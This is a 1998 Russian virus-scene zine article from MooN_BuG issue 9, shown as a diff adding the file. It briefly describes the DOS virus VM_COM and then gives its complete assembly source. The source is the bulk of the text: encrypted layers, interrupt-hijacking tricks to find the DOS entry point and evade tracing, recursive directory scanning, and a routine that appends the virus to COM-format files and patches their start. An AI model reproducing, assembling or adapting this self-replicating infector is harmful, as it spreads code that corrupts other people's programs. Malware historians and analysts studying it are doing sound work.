@@ -1,0 +1,641 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 9, Dec 1998                                           file 007
+
+                                 Вирус VM_COM
+                                              by CrkV
+
+     По  типу  Marina (см. предыдущую статью) был создан вирус VM_COM, который
+заражает  файлы только COM-формата (.COM и.EXE), приписывая себя в конец файла
+и  модифицируя  начало  файла. Признаком заражения является символ 'V' (56h) в
+четвертом  байте  (есть  идея  получать  этот  байт  с  помощью функции XOR из
+третьего байта).
+
+=== Cut ===
+;вирус VM_COM 1.01
+;use tasm vm_com /m2
+;tlink vm_com /t
+
+.286
+
+Debug   EQU     0                       ;Для отладки Debug = 1
+
+IF      Debug                           ;обработчик Int 21h
+Int21h  EQU     21h
+XB      EQU     0                       ;1 байт для XOR в Int 21h
+XB2     EQU     0                       ;2 байт -\\-
+ELSE
+Int21h  EQU     03h
+XB      EQU     95h                     ;1 байт для XOR в Int 21h
+XB2     EQU     63h                     ;2 байт -\\-
+ENDIF
+
+XW      EQU     XB Shl 8 + XB2          ;Слово для XOR в Int 21h
+
+
+;================================================
+;       0123456789 123456789 123456789 123456789 123456789 123456789
+;================================================
+
+CSeg    Segment Para 'code'
+        Assume  Cs:CSeg,Ds:CSeg,Ss:CSeg,Es:CSeg
+
+        Org     0D4h                    ;располагаем данные в DTA
+Sav_SP  dw      ?
+Prov_Ip dw      ?                       ;адрес входа в DOS
+Prov_Cs dw      ?
+RandPar dw      ?
+
+        Org     100h
+VM:
+;----------------------------------------------
+;=========== болванка для запуска =============
+;----------------------------------------------
+
+        PushF
+
+IF      Debug
+        Sub     Si,Si
+ENDIF
+
+        PushA
+        Mov     Bp,Sp
+        Sub     Si,Si
+        Push    Ds Si Si
+        Pop     Ds
+        Mov     Di,0C0h
+        Mov     Cx,8
+        Repe    MovSW                   ;Сохраняем 4 обработчика
+        Mov     Si,24h*4
+        MovSW                           ;Int 24h
+        MovSW
+
+IF      Debug
+ELSE
+        Mov     Ds:[01h*4][2],Cs        ;устанавливаем Seg Int 1
+        Mov     Ds:[Int21h*4],Offset New03h;устанавливаем Int 3
+        Mov     Ds:[Int21h*4][2],Cs
+ENDIF
+
+        Pop     Es Ds
+        Mov     Sav_Sp,Bp
+        Jmp     RS3
+
+SB      EQU     $ - VM + 100h
+
+;----------------------------------------------
+;============== первая часть ==================
+;----------------------------------------------
+
+S1      EQU     $
+
+        PushF
+        PushA
+
+        Mov     Si,1234h
+RandZn  =       Word Ptr $ - 2
+
+        Mov     RandPar,Si
+        Mov     Cx,Size2w
+
+@Loop1R:Xor     [Si+1234h],Si
+RZ      =       Word Ptr $ - 2          ;RZ=S2-RandZn
+
+        Inc     Si
+        Inc     Si
+        Loop    @Loop1R
+
+;----------------------------------------------
+;============== вторая часть ==================
+;----------------------------------------------
+
+S2      EQU     $
+
+        Mov     Bp,Sp
+        Mov     Ax,(24h+1)*4
+        Sub     Si,Si
+        Push    Si Ds Si Si
+        Pop     Ds
+        Mov     Di,0C0h
+        Mov     Cx,8
+        Cli
+        Repe    MovSW                   ;Сохраняем 4 обработчика
+        Mov     Si,24h*4
+        MovSW                           ;Int 24h
+        MovSW
+        Pop     Es Ds Ss                ;Ss:Sp - 0:0010h (Удачи !!!)
+        Mov     Sp,Cs
+        XChg    Sp,Ax
+
+        Mov     Bx,Offset New24h
+Ofs21   =       Word Ptr $ - 2
+
+        Push    Ax                      ;Устанавливаем Int 24h
+        Push    Bx
+        Sub     Sp,24h*4 - 10h
+        Sub     Bx,SmPush1
+        Push    Ax                      ;Устанавливаем Int 3
+        Push    Bx
+        Sub     Sp,4
+        Sub     Bx,SmPush2
+        Push    Ax                      ;Устанавливаем Int 1
+        Push    Bx
+
+        Mov     Sp,Bp
+        Mov     Ss,Ax
+        Push    300h
+        PopF                            ;TF=1
+        Mov     Sav_Sp,Bp
+;---------------------------------------------
+MyRand  Proc
+; Cx-нижняя граница,Bx-верхняя граница
+; Ax-случайное число
+        Push    Bx Cx Dx
+        Mov     Ax,Cs:RandPar
+        Add     Ax,9248h
+        Ror     Ax,3
+        Xor     Ax,9248h
+        Add     Ax,11h
+        Mov     Cs:RandPar,Ax
+        And     Ax,7FFFh
+        Sub     Bx,Cx
+        Inc     Bx
+        Sub     Dx,Dx
+        IDiv    Bx
+        Add     Cx,Dx
+        Pop     Dx Ax Bx
+        Xchg    Cx,Ax
+        Ret
+MyRand  EndP
+;---------------------------------------------
+Int_01:
+
+        Push    Offset RS3
+Ofs23   =       Word Ptr $ - 2
+
+        Mov     Di,Offset S3
+Ofs24   =       Word Ptr $ - 2
+
+@Shifr: Mov     Dx,Size3w
+        Mov     Bx,07FFFh               ;Cx=0 (Repe)
+@LoopRs:Call    MyRand
+        Xor     [Di],Ax
+        Inc     Di
+        Inc     Di
+        Dec     Dx
+        Jnz     @LoopRs                 ;расшифровываем
+        Ret
+
+Size2w  EQU     ($ - S2)/2
+
+;----------------------------------------------
+;============== третья часть ==================
+;----------------------------------------------
+
+S3      EQU     $
+
+;----- обработчик прерывания 01h -----
+
+New01h:
+
+        PushA
+        Mov     Bp,Sp
+        Push    Ds Es Cs
+        Pop     Ds
+
+        Mov     Ax,[Bp+18]              ;Cs адрес следующей команды
+        Cmp     Ax,Prov_Cs              ;ищем наименьший сегмент
+        Jae     @Exit_01h               ;выше равно
+        Push    Ss
+        Pop     Es
+        Mov     Cx,[Bp+6]               ;устанавливаем равные Sp
+        Mov     Ds:[0E6h],Cx
+        Mov     Si,0E0h
+        Mov     Di,Bp
+        Mov     Cx,8                    ;8 регистров
+        RepZ    CmpSW
+        Or      Cx,Cx
+        Jnz     @Exit_01h               ;регистры не совпадают
+        Mov     Prov_Cs,Ax
+        Mov     Ax,[Bp+16]              ;Ip следующей команды
+        Mov     Prov_Ip,Ax
+@Exit_01h:
+        Pop     Es Ds
+        PopA
+        IRet
+
+;----- обработчик прерывания 03h -----
+SmPush2 EQU     $ - Offset Int_01
+
+New03h:
+        Xor     Ax,XW
+        Jmp     DWord Ptr Cs:Prov_Ip
+
+;----- обработчик прерывания 24h -----
+SmPush1 EQU     $ - Offset New03h
+
+New24h:
+        Mov     Al,3
+        IRet
+;---------------------------------------------
+
+RS3     EQU     $
+        Mov     Si,Offset New01h
+Ofs31   =       Word Ptr $ - 2          ;Offset New01h
+
+IF      Debug
+ELSE
+        Mov     Es:[01h*4],Si           ;устанавливаем Int 1
+ENDIF
+
+        Add     Si,StrSize
+        Mov     Prov_Cs,Cs
+        Mov     Ah,19h                  ;получить текущий диск
+        Mov     Sp,0F0h
+        PushA                           ;Сохраняем все регистры для проверки
+        Mov     Sp,Bp
+        PushF
+
+IF      Debug
+ELSE
+        Push    300h                    ;TF,IF = 1
+        PopF
+ENDIF
+        Call    DWord Ptr Es:[21h*4]    ;Int 21h получить текущий диск
+
+        Add     Al,'A'
+        Mov     [Si+FileMsk],Al         ;Буква текущего диска
+
+        Call    Rand08h                 ;инициализируем параметр RANDOM
+        Test    Al,0000111b
+        Jnz     @NotC
+        Mov     Byte Ptr [Si+FileMsk],'C'
+@NotC:  Mov     RandPar,Ax
+
+        Mov     Bp,KolDir
+        Mov     Ax,Cs
+        Mov     Es,Ax
+        Mov     Di,100h
+        Push    Si
+        Add     Si,LoadDB
+        MovSW
+        MovSW
+        Pop     Si
+        Add     Ax,1000h
+        Mov     Es,Ax
+        Mov     Di,80h
+        Mov     Cx,9
+        Repe    MovSB
+        Mov     Ds,Ax
+        Sub     Bx,Bx
+        Call    ScTree
+;---------------------------------------------
+Rand08h Proc
+        Push    Ds
+        Push    0
+        Pop     Ds
+        Mov     Ax,Ds:[46Ch]
+        Pop     Ds
+        Ret
+Rand08h EndP
+;---------------------------------------------
+Infect  Proc
+        Push    Bx Ds Ds Cs
+        Pop     Ds Es
+        Mov     Bp,Ax                   ;размер файла
+        Mov     Si,Offset S1
+Ofs32   =       Word Ptr $ - 2          ;Offset S1
+
+        Sub     Di,Di
+        Mov     Cx,Savedb/2
+        Repe    MovSW                   ;копируем вирус
+
+        Add     Di,5
+        Mov     Byte Ptr Es:[Di-1],0E9h ;Jmp
+        Sub     Ax,3
+        StoSW
+        Mov     Al,'V'
+        StoSB
+
+        Sub     Si,Savedb - RelTab      ;адрес моей таблицы
+        Mov     Cx,KolRel
+
+@ZapRel:LodSW
+        Xchg    Di,Ax
+        LodSW
+        Add     Ax,Bp
+        StoSW
+        Loop    @ZapRel
+
+        Call    Rand08h
+        Mov     RandPar,Ax
+
+        Pop     Ds
+
+        Push    Ax
+        Mov     [RandZn - SB],Ax
+        Neg     Ax
+        Add     Ax,Offset S2 - S1 + 100h
+        Add     Ax,Bp
+        Mov     [RZ-SB],Ax
+        Mov     Di,Offset S3 - SB
+        Call    @Shifr                  ;зашифровываем 3 часть
+        Pop     Ax
+
+        Mov     Cx,Size2w
+        Mov     Si,Offset S2 - S1
+
+@LoopI: Xor     [Si],Ax                 ;зашифровываем 2 часть
+        Inc     Ax
+        Inc     Ax
+        Inc     Si
+        Inc     Si
+        Loop    @LoopI
+
+        Mov     Ax,5700h Xor XW
+        Pop     Bx
+        Int     Int21h
+        Push    Cx Dx
+
+        Mov     Ah,40h Xor XB
+        Mov     Cx,SizeVIR
+        Sub     Dx,Dx
+        Int     Int21h
+        Mov     Ax,4200h Xor XW
+        Mov     Si,04h
+        Jnc     @NoErr
+        Mov     Al,02h Xor XB2
+        Sub     Si,Si
+@NoErr: Sub     Cx,Cx                   ;Dx=0
+        Int     Int21h
+        Mov     Ah,40h Xor XB
+        Mov     Cx,Si
+        Mov     Dx,SizeVir
+        Int     Int21h
+        Mov     Ax,5701h Xor XW
+        Pop     Dx Cx
+        Int     Int21h
+        Mov     Ah,3Eh Xor XB
+        Int     Int21h
+Infect  EndP
+;---------------------------------------------
+@ExitVir:
+        Push    Cs
+        Pop     Ds
+        Mov     Ah,1Ah Xor XB
+        Mov     Dx,80h
+        Int     Int21h                  ;Восстанавливаем DTA
+        Mov     Si,0C0h
+        Sub     Di,Di
+        Push    Di
+        Pop     Es
+        Mov     Cx,8
+        Repe    MovSW                   ;Восстанавливаем 4 обработчика
+        Mov     Di,24h*4
+        MovSW                           ;Int 24h
+        MovSW
+        Push    Cs
+        Pop     Es
+        Mov     Sp,Sav_Sp
+        PopA
+        PopF
+        Push    Si
+        Ret
+;---------------------------------------------
+ProvFrm Proc
+;Проверка внутреннего формата файла
+        Push    Ds
+        Mov     Ax,3D02h Xor XW
+        Int     Int21h
+        Jc      @ErrPF1
+        Xchg    Bx,Ax
+        Mov     Ax,Ds
+        Add     Bp,80h
+        Shr     Bp,4
+        Add     Ax,Bp                   ;получили свободный сегмент
+        Mov     Ds,Ax
+        Mov     Ah,3Fh Xor XB           ;Прочитали первые 4 байта
+        Mov     Cx,4
+        Mov     Dx,Savedb
+        Mov     Di,Dx
+        Int     Int21h
+        Jc      @ErrPF
+        Sub     Ax,Cx
+        Jnz     @ErrPF                  ;маленький файл
+        Mov     Ax,[Di]
+
+        Cmp     Ax,1234h                ;признак некоторых вирусов
+        Org     $-2                     ;+++ можно опустить
+        PushF
+        PushA
+        Je      @ErrPF
+
+        Cmp     Ax,'MZ'
+        Je      @ErrPF
+        Cmp     Ax,'ZM'
+        Je      @ErrPF
+        Mov     Al,[Di+3]
+
+        Cmp     Al,90h                  ;признак некоторых вирусов
+        Je      @ErrPF                  ;+++ можно опустить
+
+        Cmp     Al,'V'                  ;признак вируса
+        Je      @ErrPF
+
+        Mov     Ax,4202h Xor XW
+        Sub     Cx,Cx
+        Sub     Dx,Dx
+        Int     Int21h
+        Or      Dx,Dx
+        Jnz     @ErrPF                  ;большой файл
+        Cmp     Ax,MaxSize
+        Ja      @ErrPF                  ;большой файл
+        Jmp     Infect
+@ErrPF: Mov     Ah,3Eh Xor XB           ;закрываем файл
+        Int     Int21h
+@ErrPF1:Pop     Ds
+        Ret
+ProvFrm EndP
+;---------------------------------------------
+ProvExe Proc
+;проверка на EXEC файл
+        PushA
+        Push    Es Cs
+        Pop     Es
+        Mov     Cl,KolFN
+        Mov     Di,Offset FN1
+Ofs33   =       Word Ptr $ - 2          ;Offset FN1
+
+@LoopF: Push    Cx
+        Cmp     Es:[Di],Al              ;сравниваем размер
+        Jne     @FileN
+        Mov     Cl,Al
+        Push    Di Si
+        Inc     Di
+        Repe    CmpSB                   ;сравниваем имена
+        Pop     Si Di
+@FileN: Pop     Cx
+        Je      @NoExec
+        Mov     Bl,Es:[Di]
+        Inc     Bx
+        Sub     Bh,Bh
+        Add     Di,Bx
+        Loop    @LoopF
+        Mov     Cl,2
+        Xchg    Bx,Ax
+        Lea     Si,[Si+Bx-5]
+        Push    Di Si
+        Repe    CmpSW                   ;'.COM'
+        Pop     Si Di
+        Je      @YExec
+        Mov     Cl,4
+        Add     Di,Cx
+        Repe    CmpSB                   ;'.EXE'
+        Jne     @NoExec
+@YExec: Call    ProvFrm
+@NoExec:Pop     Es
+        PopA
+        Ret
+ProvExe EndP
+;---------------------------------------------
+ScTree  Proc
+;Bx - адрес DTA (0 - корневой каталог)
+        Dec     Bp
+        Jnz     @Ok
+        Or      Bx,Bx
+        Jnz     Short @Ex
+        Mov     Bp,KolDir
+        Sub     Si,Si
+@Ok:    Mov     Ah,1Ah Xor XB
+        Mov     Dx,Bx
+        Int     Int21h
+        Or      Bx,Bx
+        Jnz     @NRoot1                 ;Не корневой каталог
+        Mov     Byte Ptr Ds:[84h],'?'
+        Mov     Ah,4Eh Xor XB
+        Mov     Dx,81h
+        Mov     Cl,10h
+        Int     Int21h
+        Jnc     @OkRoot
+@Ex:    Jmp     @ExitVir
+@OkRoot:Mov     Bx,'Z'
+        Mov     Cx,'A'
+        Call    MyRand
+        Or      Si,Si
+        Jnz     @NAny
+        Mov     Al,'?'
+@NAny:  Mov     Ds:[84h],Al
+        Sub     Bx,Bx
+@NRoot1:Lea     Si,[Bx+80h]             ;Ds:Si - полное имя (Pascal String+00h)
+        Lea     Di,[Si+100h]
+        Mov     Cl,[Si]
+        Inc     Cx                      ;размер строки
+        Repe    MovSB
+        Mov     Ah,4Eh Xor XB
+        Mov     Dx,Bx
+        Add     Dx,81h
+        Mov     Cl,10h
+        Int     Int21h                  ;ищем первый файл
+        Jnc     @OkFile
+        Or      Bx,Bx
+        Jz      Sctree
+        Jmp     Short @NRoot2
+@OkFile:Lea     Si,[Bx+1Eh]             ;найденное имя
+@NwFind:Cmp     Byte Ptr [Si],2Eh       ;директории '.' и '..'
+        Je      @NtFind
+        Push    Di
+        Push    Si
+        Sub     Ax,Ax
+@GetNm: Mov     Ah,[Si]
+        MovSB
+        Inc     Ax
+        Or      Ah,Ah
+        Jnz     @GetNm
+        Pop     Si
+        Pop     Di
+        Push    Ax
+        Mov     Ax,4300h Xor XW
+        Lea     Dx,[Bx+181h]
+        Int     Int21h
+        Pop     Ax
+        Test    Cl,10h
+        Jne     @DIR
+        Call    ProvExe
+@NtFind:Mov     Ah,4Fh Xor XB
+        Mov     Cl,10h
+        Int     Int21h
+        Jnc     @NwFind
+@NoFile:Or      Bx,Bx
+        Jz      @Ex                     ;поиск закончен
+@NRoot2:Mov     Ax,100h
+        Sub     Bx,Ax
+        Sub     Si,Ax
+        Mov     Ah,1Ah Xor XB
+        Mov     Dx,Bx
+        Int     Int21h
+        Mov     Al,[Bx+80h]
+        Lea     Di,[Bx+180h]
+        StoSB
+        Sub     Ah,Ah
+        Add     Di,Ax
+        Ret
+@DIR:   Mov     Di,Dx
+        Dec     Di
+        Add     [Di],Al
+        Mov     Al,[Di]
+        Add     Di,Ax
+        Mov     Ax,2A5Ch                ;'\*.*',00h
+        StoSW
+        Mov     Al,'.'
+        StoSW
+        Mov     Al,00h
+        StoSB
+        Add     Bx,100h
+        Call    ScTree
+        Jmp     Short @NtFind
+ScTree  EndP
+;---------------------------------------------
+;Таблица перемещаемых элементов
+KolRel  EQU     (EndTab - RelTab)/4
+RelTab  EQU     $ - S1
+R21     dw      Ofs21 - S1
+        dw      Offset New24h - S1 + 100h
+R23     dw      Ofs23 - S1
+        dw      RS3 - S1 + 100h
+R24     dw      Ofs24 - S1
+        dw      S3 - S1 + 100h
+R31     dw      Ofs31 - S1
+        dw      Offset New01h - S1 + 100h
+R32     dw      Ofs32 - S1
+        dw      100h
+R33     dw      Ofs33 - S1
+        dw      Offset FN1 - S1 + 100h
+EndTab  EQU     $ - S1
+;---------------------------------------------
+
+StrSize EQU     $ - Offset New01h
+db3     db      3
+
+FileMsk EQU     $ - db3
+        db      '?:\?*.*',00h
+
+KolFN   EQU     2                       ;количество незаражаемых файлов
+FN1     db      0Ch,'COMMAND.COM',00h
+FN2     db      08h,'WIN.COM',00h
+FileCom db      '.COM'
+FileExe db      '.EXE'
+        Align   2
+;---------------------------------------------
+Savedb  EQU     $ - S1
+Loaddb  EQU     $ - db3
+        db      0C3h,3 Dup (?)          ;сюда пишем начало файла
+
+;---------------------------------------------
+Size3w  EQU     ($ - S3)/2
+KolDIR  EQU     8                       ;кол. сканируемых вложенных поддиректорий
+SizeVIR EQU     $ - S1                  ;размер вируса
+MaxSize EQU     0FC00h-SizeVIR          ;максимальный размер заражаемого файла
+;---------------------------------------------
+@EndVM:
+CSeg    EndS
+        End     VM
+=== Cut ===
